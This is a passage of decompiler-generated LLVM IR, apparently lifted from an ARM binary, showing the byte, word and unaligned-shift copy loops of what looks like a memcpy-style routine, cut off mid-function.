  %v1_17428 = phi i1 [ %v8_17424, %bb138 ], [ %v1_17424, %dec_label_pc_1741c ]
  %v0_17428 = phi i1 [ %v9_17424, %bb138 ], [ %v0_17424, %dec_label_pc_1741c ]
  %v2_17428 = xor i1 %v1_17428, %v0_17428
  br i1 %v2_17428, label %dec_label_pc_1742c, label %dec_label_pc_1741c

dec_label_pc_1742c:                               ; preds = %.thread115, %dec_label_pc_173d8
  %v4_1743c = phi i32 [ %v0_173f094, %dec_label_pc_173d8 ], [ %v3_1742099116, %.thread115 ]
  %v0_1742c = phi i32 [ %v1_173d8, %dec_label_pc_173d8 ], [ %v0_1742c.pre, %.thread115 ]
  %v1_1742c = add i32 %v0_1742c, 8
  store i32 %v1_1742c, i32* %r2.global-to-local, align 4
  %v3_1742c = sub i32 0, %v0_1742c
  %v4_1742c = and i32 %v1_1742c, %v3_1742c
  %v5_1742c = icmp slt i32 %v4_1742c, 0
  store i1 %v5_1742c, i1* %cpsr_v.global-to-local, align 1
  %v6_1742c = icmp slt i32 %v1_1742c, 0
  store i1 %v6_1742c, i1* %cpsr_n.global-to-local, align 1
  %v7_1742c = icmp eq i32 %v1_1742c, 0
  store i1 %v7_1742c, i1* %cpsr_z.global-to-local, align 1
  %v2_17430 = xor i1 %v6_1742c, %v5_1742c
  br i1 %v2_17430, label %bb140, label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_1742c
  %v1_17434 = add i32 %v0_1742c, 4
  store i32 %v1_17434, i32* %r2.global-to-local, align 4
  %v3_17434 = sub i32 -5, %v0_1742c
  %v4_17434 = and i32 %v3_17434, %v1_1742c
  %v5_17434 = icmp slt i32 %v4_17434, 0
  store i1 %v5_17434, i1* %cpsr_v.global-to-local, align 1
  %v6_17434 = icmp slt i32 %v1_17434, 0
  store i1 %v6_17434, i1* %cpsr_n.global-to-local, align 1
  %v7_17434 = icmp eq i32 %v1_1742c, 4
  store i1 %v7_17434, i1* %cpsr_z.global-to-local, align 1
  %v2_17438 = xor i1 %v6_17434, %v5_17434
  %v3_17438 = load i32, i32* @r1, align 4
  %v4_17438 = inttoptr i32 %v3_17438 to i32*
  %v5_17438 = load i32, i32* %v4_17438, align 4
  store i32 %v5_17438, i32* @r3, align 4
  %v7_17438 = add i32 %v3_17438, 4
  br i1 %v2_17438, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_17434
  store i32 %v7_17438, i32* @r1, align 4
  %v5_1743c = inttoptr i32 %v4_1743c to i32*
  store i32 %v5_17438, i32* %v5_1743c, align 4
  %v6_1743c = load i32, i32* @r0, align 4
  %v7_1743c = add i32 %v6_1743c, 4
  store i32 %v7_1743c, i32* @r0, align 4
  %v0_1744c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_17434
  %v7_17440 = inttoptr i32 %v7_17438 to i32*
  %v8_17440 = load i32, i32* %v7_17440, align 4
  store i32 %v8_17440, i32* @ip, align 4
  %v9_17440 = add i32 %v3_17438, 8
  store i32 %v9_17440, i32* @r1, align 4
  %v4_17444 = inttoptr i32 %v4_1743c to i32*
  store i32 %v5_17438, i32* %v4_17444, align 4
  %v6_17444 = add i32 %v4_1743c, 4
  %v7_17444 = inttoptr i32 %v6_17444 to i32*
  %v8_17444 = load i32, i32* @ip, align 4
  store i32 %v8_17444, i32* %v7_17444, align 4
  %v9_17444 = add i32 %v4_1743c, 8
  store i32 %v9_17444, i32* @r0, align 4
  %v3_17448 = load i32, i32* %r2.global-to-local, align 4
  %v4_17448 = add i32 %v3_17448, -4
  store i32 %v4_17448, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1742c, %bb, %dec_label_pc_175fc, %dec_label_pc_17590, %dec_label_pc_17524, %bb139
  %v0_1744c = phi i32 [ %v0_1744c.pre, %.thread122 ], [ %v2_1749c, %.thread128 ], [ %v1_1742c, %dec_label_pc_1742c ], [ %v2_173c0, %bb ], [ %v0_1744c61, %dec_label_pc_175fc ], [ %v0_1744c60, %dec_label_pc_17590 ], [ %v0_1744c59, %dec_label_pc_17524 ], [ %v4_17448, %bb139 ]
  %v1_1744c = add i32 %v0_1744c, 4
  store i32 %v1_1744c, i32* %r2.global-to-local, align 4
  %v3_1744c = sub i32 0, %v0_1744c
  %v4_1744c = and i32 %v1_1744c, %v3_1744c
  %v5_1744c = icmp slt i32 %v4_1744c, 0
  store i1 %v5_1744c, i1* %cpsr_v.global-to-local, align 1
  %v6_1744c = icmp slt i32 %v1_1744c, 0
  store i1 %v6_1744c, i1* %cpsr_n.global-to-local, align 1
  %v7_1744c = icmp eq i32 %v1_1744c, 0
  store i1 %v7_1744c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1744c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_17454.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_17450 = load i8*, i8** %stack_var_-8, align 4
  %v4_17450 = ptrtoint i8* %v3_17450 to i32
  store i32 %v4_17450, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_17454 = phi i32 [ %v0_17454.pre, %bb140.bb142_crit_edge ], [ %v8_173bc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1744c, i32 %v0_17454)
  %v0_17458 = load i32, i32* %r2.global-to-local, align 4
  %v1_17458 = add i32 %v0_17458, -2
  %v3_17458 = sub i32 1, %v0_17458
  %v4_17458 = and i32 %v3_17458, %v0_17458
  %v5_17458 = icmp slt i32 %v4_17458, 0
  store i1 %v5_17458, i1* %cpsr_v.global-to-local, align 1
  %v6_17458 = icmp slt i32 %v1_17458, 0
  store i1 %v6_17458, i1* %cpsr_n.global-to-local, align 1
  %v7_17458 = icmp eq i32 %v0_17458, 2
  store i1 %v7_17458, i1* %cpsr_z.global-to-local, align 1
  %v0_1745c = load i32, i32* @r1, align 4
  %v1_1745c = inttoptr i32 %v0_1745c to i8*
  %v2_1745c = load i8, i8* %v1_1745c, align 1
  %v5_1745c = add i32 %v0_1745c, 1
  store i32 %v5_1745c, i32* %r1.global-to-local, align 4
  %v2_17460 = load i32, i32* @r0, align 4
  %v3_17460 = inttoptr i32 %v2_17460 to i8*
  store i8 %v2_1745c, i8* %v3_17460, align 1
  %v4_17460 = load i32, i32* @r0, align 4
  %v5_17460 = add i32 %v4_17460, 1
  store i32 %v5_17460, i32* %r0.global-to-local, align 4
  %v0_17464 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17464 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17464 = xor i1 %v0_17464, %v1_17464
  br i1 %v2_17464, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17464 = load i32, i32* %r1.global-to-local, align 4
  %v4_17464 = inttoptr i32 %v3_17464 to i8*
  %v5_17464 = load i8, i8* %v4_17464, align 1
  %v8_17464 = add i32 %v3_17464, 1
  store i32 %v8_17464, i32* %r1.global-to-local, align 4
  %v6_17468 = inttoptr i32 %v5_17460 to i8*
  store i8 %v5_17464, i8* %v6_17468, align 1
  %v7_17468 = load i32, i32* %r0.global-to-local, align 4
  %v8_17468 = add i32 %v7_17468, 1
  store i32 %v8_17468, i32* %r0.global-to-local, align 4
  %v1_1746c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1746c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17470 = phi i32 [ %v8_17468, %bb143 ], [ %v5_17460, %bb142 ]
  %v2_17470 = phi i1 [ %v2_1746c.pre, %bb143 ], [ %v1_17464, %bb142 ]
  %v1_17470 = phi i1 [ %v1_1746c.pre, %bb143 ], [ %v0_17464, %bb142 ]
  %v0_1746c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1746c = xor i1 %v2_17470, %v1_17470
  %v4_1746c = or i1 %v0_1746c, %v3_1746c
  br i1 %v4_1746c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1746c = load i32, i32* %r1.global-to-local, align 4
  %v6_1746c = inttoptr i32 %v5_1746c to i8*
  %v7_1746c = load i8, i8* %v6_1746c, align 1
  %v10_1746c = add i32 %v5_1746c, 1
  store i32 %v10_1746c, i32* %r1.global-to-local, align 4
  %v8_17470 = inttoptr i32 %v7_17470 to i8*
  store i8 %v7_1746c, i8* %v8_17470, align 1
  %v9_17470 = load i32, i32* %r0.global-to-local, align 4
  %v10_17470 = add i32 %v9_17470, 1
  store i32 %v10_17470, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17474 = load i8*, i8** %stack_var_-8, align 4
  %v3_17474 = ptrtoint i8* %v2_17474 to i32
  store i32 %v3_17474, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_173bc)
  %v0_1747c.pre = load i32, i32* @ip, align 4
  %v0_17484.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_17488.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %dec_label_pc_173c8, %.thread126
  %v2_17488 = phi i32 [ %v1_173b0, %dec_label_pc_173c8 ], [ %v2_17488.pre, %.thread126 ]
  %v0_17484 = phi i32 [ %v0_173b0, %dec_label_pc_173c8 ], [ %v0_17484.pre, %.thread126 ]
  %v0_1747c = phi i32 [ %v1_173c8, %dec_label_pc_173c8 ], [ %v0_1747c.pre, %.thread126 ]
  %v1_1747c = sub i32 4, %v0_1747c
  store i32 %v1_1747c, i32* @ip, align 4
  %v1_17480 = add i32 %v1_1747c, -2
  %v3_17480 = sub i32 1, %v1_1747c
  %v4_17480 = and i32 %v3_17480, %v1_1747c
  %v5_17480 = icmp slt i32 %v4_17480, 0
  store i1 %v5_17480, i1* %cpsr_v.global-to-local, align 1
  %v6_17480 = icmp slt i32 %v1_17480, 0
  store i1 %v6_17480, i1* %cpsr_n.global-to-local, align 1
  %v7_17480 = icmp eq i32 %v1_1747c, 2
  store i1 %v7_17480, i1* %cpsr_z.global-to-local, align 1
  %v1_17484 = inttoptr i32 %v0_17484 to i8*
  %v2_17484 = load i8, i8* %v1_17484, align 1
  %v3_17484 = zext i8 %v2_17484 to i32
  store i32 %v3_17484, i32* @r3, align 4
  %v5_17484 = add i32 %v0_17484, 1
  store i32 %v5_17484, i32* @r1, align 4
  %v3_17488 = inttoptr i32 %v2_17488 to i8*
  store i8 %v2_17484, i8* %v3_17488, align 1
  %v4_17488 = load i32, i32* @r0, align 4
  %v5_17488 = add i32 %v4_17488, 1
  store i32 %v5_17488, i32* @r0, align 4
  %v0_1748c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1748c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1748c = xor i1 %v0_1748c, %v1_1748c
  br i1 %v2_1748c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1747c
  %v3_1748c = load i32, i32* @r1, align 4
  %v4_1748c = inttoptr i32 %v3_1748c to i8*
  %v5_1748c = load i8, i8* %v4_1748c, align 1
  %v6_1748c = zext i8 %v5_1748c to i32
  store i32 %v6_1748c, i32* @r3, align 4
  %v8_1748c = add i32 %v3_1748c, 1
  store i32 %v8_1748c, i32* @r1, align 4
  %v6_17490 = inttoptr i32 %v5_17488 to i8*
  store i8 %v5_1748c, i8* %v6_17490, align 1
  %v7_17490 = load i32, i32* @r0, align 4
  %v8_17490 = add i32 %v7_17490, 1
  store i32 %v8_17490, i32* @r0, align 4
  %v1_17494.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17494.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1747c, %bb145
  %v7_17498 = phi i32 [ %v8_17490, %bb145 ], [ %v5_17488, %dec_label_pc_1747c ]
  %v2_17498 = phi i1 [ %v2_17494.pre, %bb145 ], [ %v1_1748c, %dec_label_pc_1747c ]
  %v1_17498 = phi i1 [ %v1_17494.pre, %bb145 ], [ %v0_1748c, %dec_label_pc_1747c ]
  %v0_17494 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17494 = xor i1 %v2_17498, %v1_17498
  %v4_17494 = or i1 %v0_17494, %v3_17494
  br i1 %v4_17494, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_17494 = load i32, i32* @r1, align 4
  %v6_17494 = inttoptr i32 %v5_17494 to i8*
  %v7_17494 = load i8, i8* %v6_17494, align 1
  %v8_17494 = zext i8 %v7_17494 to i32
  store i32 %v8_17494, i32* @r3, align 4
  %v10_17494 = add i32 %v5_17494, 1
  store i32 %v10_17494, i32* @r1, align 4
  %v8_17498 = inttoptr i32 %v7_17498 to i8*
  store i8 %v7_17494, i8* %v8_17498, align 1
  %v9_17498 = load i32, i32* @r0, align 4
  %v10_17498 = add i32 %v9_17498, 1
  store i32 %v10_17498, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_175cc77 = phi i32 [ %v10_17498, %bb146 ], [ %v7_17498, %.thread127 ]
  %v0_1749c = load i32, i32* %r2.global-to-local, align 4
  %v1_1749c = load i32, i32* @ip, align 4
  %v2_1749c = sub i32 %v0_1749c, %v1_1749c
  store i32 %v2_1749c, i32* %r2.global-to-local, align 4
  %v4_1749c = xor i32 %v1_1749c, %v0_1749c
  %v5_1749c = xor i32 %v2_1749c, %v0_1749c
  %v6_1749c = and i32 %v5_1749c, %v4_1749c
  %v7_1749c = icmp slt i32 %v6_1749c, 0
  store i1 %v7_1749c, i1* %cpsr_v.global-to-local, align 1
  %v8_1749c = icmp slt i32 %v2_1749c, 0
  store i1 %v8_1749c, i1* %cpsr_n.global-to-local, align 1
  %v9_1749c = icmp eq i32 %v0_1749c, %v1_1749c
  store i1 %v9_1749c, i1* %cpsr_z.global-to-local, align 1
  %v2_174a0 = xor i1 %v8_1749c, %v7_1749c
  br i1 %v2_174a0, label %bb140, label %dec_label_pc_174a4

dec_label_pc_174a4:                               ; preds = %.thread128
  %v0_174a4 = load i32, i32* @r1, align 4
  %v1_174a4 = urem i32 %v0_174a4, 4
  store i32 %v1_174a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174a4 = icmp eq i32 %v1_174a4, 0
  store i1 %v2_174a4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_174a4 to i2
  br i1 %v2_174a4, label %dec_label_pc_173d8, label %dec_label_pc_174ac

dec_label_pc_174ac:                               ; preds = %dec_label_pc_173d0, %dec_label_pc_174a4
  %v0_175cc76 = phi i32 [ %v1_173b0, %dec_label_pc_173d0 ], [ %v0_175cc77, %dec_label_pc_174a4 ]
  %v0_17534 = phi i32 [ %v2_173c0, %dec_label_pc_173d0 ], [ %v2_1749c, %dec_label_pc_174a4 ]
  %v0_174b4.off0 = phi i2 [ %extract.t, %dec_label_pc_173d0 ], [ %extract.t131, %dec_label_pc_174a4 ]
  %v0_174ac = phi i32 [ %v0_173b0, %dec_label_pc_173d0 ], [ %v0_174a4, %dec_label_pc_174a4 ]
  %v1_174ac = and i32 %v0_174ac, -4
  store i32 %v1_174ac, i32* %r1.global-to-local, align 4
  %v1_174b0 = inttoptr i32 %v1_174ac to i32*
  %v2_174b0 = load i32, i32* %v1_174b0, align 4
  store i32 %v2_174b0, i32* %lr.global-to-local, align 4
  %v4_174b0 = add i32 %v1_174ac, 4
  store i32 %v4_174b0, i32* %r1.global-to-local, align 4
  %v1_1752c = add i32 %v0_17534, -12
  %v3_1752c = sub i32 11, %v0_17534
  %v4_1752c = and i32 %v3_1752c, %v0_17534
  %v5_1752c = icmp slt i32 %v4_1752c, 0
  store i1 %v5_1752c, i1* %cpsr_v.global-to-local, align 1
  %v6_1752c = icmp slt i32 %v1_1752c, 0
  store i1 %v6_1752c, i1* %cpsr_n.global-to-local, align 1
  %v7_1752c = icmp eq i32 %v0_17534, 12
  store i1 %v7_1752c, i1* %cpsr_z.global-to-local, align 1
  %v2_17530 = xor i1 %v6_1752c, %v5_1752c
  switch i2 %v0_174b4.off0, label %dec_label_pc_174c0 [
    i2 -1, label %dec_label_pc_17598
    i2 -2, label %dec_label_pc_1752c
  ]

dec_label_pc_174c0:                               ; preds = %dec_label_pc_174ac
  br i1 %v2_17530, label %dec_label_pc_1750c, label %dec_label_pc_174c8

dec_label_pc_174c8:                               ; preds = %dec_label_pc_174c0
  store i32 %v1_1752c, i32* %r2.global-to-local, align 4
  %v3_174cc = load i32, i32* @r4, align 4
  store i32 %v3_174cc, i32* %stack_var_-16, align 4
  %v6_174cc = load i32, i32* @r5, align 4
  store i32 %v6_174cc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %dec_label_pc_174d0.dec_label_pc_174d0_crit_edge, %dec_label_pc_174c8
  %v0_174f4 = phi i32 [ %v12_174f4, %dec_label_pc_174d0.dec_label_pc_174d0_crit_edge ], [ %v0_175cc76, %dec_label_pc_174c8 ]
  %v0_174d4 = phi i32 [ %v0_174d4.pre, %dec_label_pc_174d0.dec_label_pc_174d0_crit_edge ], [ %v4_174b0, %dec_label_pc_174c8 ]
  %v0_174d0 = phi i32 [ %v0_174d0.pre, %dec_label_pc_174d0.dec_label_pc_174d0_crit_edge ], [ %v2_174b0, %dec_label_pc_174c8 ]
  %v3_174d0 = udiv i32 %v0_174d0, 256
  %v1_174d4 = inttoptr i32 %v0_174d4 to i32*
  %v2_174d4 = load i32, i32* %v1_174d4, align 4
  store i32 %v2_174d4, i32* %r4.global-to-local, align 4
  %v3_174d4 = add i32 %v0_174d4, 4
  %v4_174d4 = inttoptr i32 %v3_174d4 to i32*
  %v5_174d4 = load i32, i32* %v4_174d4, align 4
  store i32 %v5_174d4, i32* %r5.global-to-local, align 4
  %v6_174d4 = add i32 %v0_174d4, 8
  %v7_174d4 = inttoptr i32 %v6_174d4 to i32*
  %v8_174d4 = load i32, i32* %v7_174d4, align 4
  store i32 %v8_174d4, i32* %ip.global-to-local, align 4
  %v9_174d4 = add i32 %v0_174d4, 12
  %v10_174d4 = inttoptr i32 %v9_174d4 to i32*
  %v11_174d4 = load i32, i32* %v10_174d4, align 4
  store i32 %v11_174d4, i32* %lr.global-to-local, align 4
  %v12_174d4 = add i32 %v0_174d4, 16
  store i32 %v12_174d4, i32* %r1.global-to-local, align 4
  %v4_174d8 = mul i32 %v2_174d4, 16777216
  %v5_174d8 = or i32 %v4_174d8, %v3_174d0
  store i32 %v5_174d8, i32* @r3, align 4
  %v3_174dc = udiv i32 %v2_174d4, 256
  %v4_174e0 = mul i32 %v5_174d4, 16777216
  %v5_174e0 = or i32 %v4_174e0, %v3_174dc
  store i32 %v5_174e0, i32* %r4.global-to-local, align 4
  %v3_174e4 = udiv i32 %v5_174d4, 256
  %v4_174e8 = mul i32 %v8_174d4, 16777216
  %v5_174e8 = or i32 %v4_174e8, %v3_174e4
  store i32 %v5_174e8, i32* %r5.global-to-local, align 4
  %v3_174ec = udiv i32 %v8_174d4, 256
  %v4_174f0 = mul i32 %v11_174d4, 16777216
  %v5_174f0 = or i32 %v4_174f0, %v3_174ec
  store i32 %v5_174f0, i32* @ip, align 4
  %v1_174f4 = inttoptr i32 %v0_174f4 to i32*
  store i32 %v5_174d8, i32* %v1_174f4, align 4
  %v3_174f4 = add i32 %v0_174f4, 4
  %v4_174f4 = inttoptr i32 %v3_174f4 to i32*
  %v5_174f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174f4, i32* %v4_174f4, align 4
  %v6_174f4 = add i32 %v0_174f4, 8
  %v7_174f4 = inttoptr i32 %v6_174f4 to i32*
  %v8_174f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_174f4, i32* %v7_174f4, align 4
  %v9_174f4 = add i32 %v0_174f4, 12
  %v10_174f4 = inttoptr i32 %v9_174f4 to i32*
  %v11_174f4 = load i32, i32* @ip, align 4
  store i32 %v11_174f4, i32* %v10_174f4, align 4
  %v12_174f4 = add i32 %v0_174f4, 16
  store i32 %v12_174f4, i32* @r0, align 4
  %v0_174f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174f8 = add i32 %v0_174f8, -16
  store i32 %v1_174f8, i32* %r2.global-to-local, align 4
  %v3_174f8 = sub i32 15, %v0_174f8
  %v4_174f8 = and i32 %v3_174f8, %v0_174f8
  %v5_174f8 = icmp slt i32 %v4_174f8, 0
  %v6_174f8 = icmp slt i32 %v1_174f8, 0
  %v2_174fc = xor i1 %v6_174f8, %v5_174f8
  br i1 %v2_174fc, label %dec_label_pc_17500, label %dec_label_pc_174d0.dec_label_pc_174d0_crit_edge

dec_label_pc_174d0.dec_label_pc_174d0_crit_edge:  ; preds = %dec_label_pc_174d0
  %v0_174d0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_174d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_174d0

dec_label_pc_17500:                               ; preds = %dec_label_pc_174d0
  %v2_17500 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17500, i32* @r4, align 4
  %v5_17500 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17500, i32* @r5, align 4
  %v1_17504 = add i32 %v0_174f8, -4
  store i32 %v1_17504, i32* %r2.global-to-local, align 4
  %v3_17504 = add i32 %v0_174f8, 2147483632
  %v4_17504 = and i32 %v1_17504, %v3_17504
  %v5_17504 = icmp slt i32 %v4_17504, 0
  store i1 %v5_17504, i1* %cpsr_v.global-to-local, align 1
  %v6_17504 = icmp slt i32 %v1_17504, 0
  store i1 %v6_17504, i1* %cpsr_n.global-to-local, align 1
  %v7_17504 = icmp eq i32 %v1_17504, 0
  store i1 %v7_17504, i1* %cpsr_z.global-to-local, align 1
  %v2_17508 = xor i1 %v6_17504, %v5_17504
  br i1 %v2_17508, label %dec_label_pc_17524, label %dec_label_pc_1750c

dec_label_pc_1750c:                               ; preds = %dec_label_pc_17500, %dec_label_pc_174c0, %dec_label_pc_1750c
  %v1_17518 = phi i32 [ %v4_17518, %dec_label_pc_1750c ], [ %v12_174f4, %dec_label_pc_17500 ], [ %v0_175cc76, %dec_label_pc_174c0 ]
  %v0_1750c = load i32, i32* %lr.global-to-local, align 4
  %v3_1750c = udiv i32 %v0_1750c, 256
  store i32 %v3_1750c, i32* %ip.global-to-local, align 4
  %v0_17510 = load i32, i32* %r1.global-to-local, align 4
  %v1_17510 = inttoptr i32 %v0_17510 to i32*
  %v2_17510 = load i32, i32* %v1_17510, align 4
  store i32 %v2_17510, i32* %lr.global-to-local, align 4
  %v4_17510 = add i32 %v0_17510, 4
  store i32 %v4_17510, i32* %r1.global-to-local, align 4
  %v4_17514 = mul i32 %v2_17510, 16777216
  %v5_17514 = or i32 %v4_17514, %v3_1750c
  store i32 %v5_17514, i32* @ip, align 4
  %v2_17518 = inttoptr i32 %v1_17518 to i32*
  store i32 %v5_17514, i32* %v2_17518, align 4
  %v3_17518 = load i32, i32* @r0, align 4
  %v4_17518 = add i32 %v3_17518, 4
  store i32 %v4_17518, i32* @r0, align 4
  %v0_1751c = load i32, i32* %r2.global-to-local, align 4
  %v1_1751c = add i32 %v0_1751c, -4
  store i32 %v1_1751c, i32* %r2.global-to-local, align 4
  %v3_1751c = sub i32 3, %v0_1751c
  %v4_1751c = and i32 %v3_1751c, %v0_1751c
  %v5_1751c = icmp slt i32 %v4_1751c, 0
  %v6_1751c = icmp slt i32 %v1_1751c, 0
  %v2_17520 = xor i1 %v6_1751c, %v5_1751c
  br i1 %v2_17520, label %dec_label_pc_17524.loopexit, label %dec_label_pc_1750c

dec_label_pc_17524.loopexit:                      ; preds = %dec_label_pc_1750c
  %v7_1751c = icmp eq i32 %v0_1751c, 4
  store i1 %v5_1751c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1751c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1751c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17524

dec_label_pc_17524:                               ; preds = %dec_label_pc_17524.loopexit, %dec_label_pc_17500
  %v0_1744c59 = phi i32 [ %v1_1751c, %dec_label_pc_17524.loopexit ], [ %v1_17504, %dec_label_pc_17500 ]
  %v0_17524 = load i32, i32* %r1.global-to-local, align 4
  %v1_17524 = add i32 %v0_17524, -3
  store i32 %v1_17524, i32* @r1, align 4
  br label %bb140

dec_label_pc_1752c:                               ; preds = %dec_label_pc_174ac
  br i1 %v2_17530, label %dec_label_pc_17578, label %dec_label_pc_17534

dec_label_pc_17534:                               ; preds = %dec_label_pc_1752c
  store i32 %v1_1752c, i32* %r2.global-to-local, align 4
  %v3_17538 = load i32, i32* @r4, align 4
  store i32 %v3_17538, i32* %stack_var_-16, align 4
  %v6_17538 = load i32, i32* @r5, align 4
  store i32 %v6_17538, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1753c

dec_label_pc_1753c:                               ; preds = %dec_label_pc_1753c.dec_label_pc_1753c_crit_edge, %dec_label_pc_17534
  %v0_17560 = phi i32 [ %v12_17560, %dec_label_pc_1753c.dec_label_pc_1753c_crit_edge ], [ %v0_175cc76, %dec_label_pc_17534 ]
  %v0_17540 = phi i32 [ %v0_17540.pre, %dec_label_pc_1753c.dec_label_pc_1753c_crit_edge ], [ %v4_174b0, %dec_label_pc_17534 ]
  %v0_1753c = phi i32 [ %v0_1753c.pre, %dec_label_pc_1753c.dec_label_pc_1753c_crit_edge ], [ %v2_174b0, %dec_label_pc_17534 ]
  %v3_1753c = udiv i32 %v0_1753c, 65536
  %v1_17540 = inttoptr i32 %v0_17540 to i32*
  %v2_17540 = load i32, i32* %v1_17540, align 4
  store i32 %v2_17540, i32* %r4.global-to-local, align 4
  %v3_17540 = add i32 %v0_17540, 4
  %v4_17540 = inttoptr i32 %v3_17540 to i32*
  %v5_17540 = load i32, i32* %v4_17540, align 4
  store i32 %v5_17540, i32* %r5.global-to-local, align 4
  %v6_17540 = add i32 %v0_17540, 8
  %v7_17540 = inttoptr i32 %v6_17540 to i32*
  %v8_17540 = load i32, i32* %v7_17540, align 4
  store i32 %v8_17540, i32* %ip.global-to-local, align 4
  %v9_17540 = add i32 %v0_17540, 12
  %v10_17540 = inttoptr i32 %v9_17540 to i32*
  %v11_17540 = load i32, i32* %v10_17540, align 4
  store i32 %v11_17540, i32* %lr.global-to-local, align 4
  %v12_17540 = add i32 %v0_17540, 16
  store i32 %v12_17540, i32* %r1.global-to-local, align 4
  %v4_17544 = mul i32 %v2_17540, 65536
  %v5_17544 = or i32 %v4_17544, %v3_1753c
  store i32 %v5_17544, i32* @r3, align 4
  %v3_17548 = udiv i32 %v2_17540, 65536
  %v4_1754c = mul i32 %v5_17540, 65536
  %v5_1754c = or i32 %v4_1754c, %v3_17548
  store i32 %v5_1754c, i32* %r4.global-to-local, align 4
  %v3_17550 = udiv i32 %v5_17540, 65536
  %v4_17554 = mul i32 %v8_17540, 65536
  %v5_17554 = or i32 %v4_17554, %v3_17550
  store i32 %v5_17554, i32* %r5.global-to-local, align 4
  %v3_17558 = udiv i32 %v8_17540, 65536
  %v4_1755c = mul i32 %v11_17540, 65536
  %v5_1755c = or i32 %v4_1755c, %v3_17558
  store i32 %v5_1755c, i32* @ip, align 4
  %v1_17560 = inttoptr i32 %v0_17560 to i32*
  store i32 %v5_17544, i32* %v1_17560, align 4
  %v3_17560 = add i32 %v0_17560, 4
  %v4_17560 = inttoptr i32 %v3_17560 to i32*
  %v5_17560 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17560, i32* %v4_17560, align 4
  %v6_17560 = add i32 %v0_17560, 8
  %v7_17560 = inttoptr i32 %v6_17560 to i32*
  %v8_17560 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17560, i32* %v7_17560, align 4
  %v9_17560 = add i32 %v0_17560, 12
  %v10_17560 = inttoptr i32 %v9_17560 to i32*
  %v11_17560 = load i32, i32* @ip, align 4
  store i32 %v11_17560, i32* %v10_17560, align 4
  %v12_17560 = add i32 %v0_17560, 16
  store i32 %v12_17560, i32* @r0, align 4
  %v0_17564 = load i32, i32* %r2.global-to-local, align 4
  %v1_17564 = add i32 %v0_17564, -16
  store i32 %v1_17564, i32* %r2.global-to-local, align 4
  %v3_17564 = sub i32 15, %v0_17564
  %v4_17564 = and i32 %v3_17564, %v0_17564
  %v5_17564 = icmp slt i32 %v4_17564, 0
  %v6_17564 = icmp slt i32 %v1_17564, 0
  %v2_17568 = xor i1 %v6_17564, %v5_17564
  br i1 %v2_17568, label %dec_label_pc_1756c, label %dec_label_pc_1753c.dec_label_pc_1753c_crit_edge

dec_label_pc_1753c.dec_label_pc_1753c_crit_edge:  ; preds = %dec_label_pc_1753c
  %v0_1753c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17540.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1753c

dec_label_pc_1756c:                               ; preds = %dec_label_pc_1753c
  %v2_1756c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1756c, i32* @r4, align 4
  %v5_1756c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1756c, i32* @r5, align 4
  %v1_17570 = add i32 %v0_17564, -4
  store i32 %v1_17570, i32* %r2.global-to-local, align 4
  %v3_17570 = add i32 %v0_17564, 2147483632
  %v4_17570 = and i32 %v1_17570, %v3_17570
  %v5_17570 = icmp slt i32 %v4_17570, 0
  store i1 %v5_17570, i1* %cpsr_v.global-to-local, align 1
  %v6_17570 = icmp slt i32 %v1_17570, 0
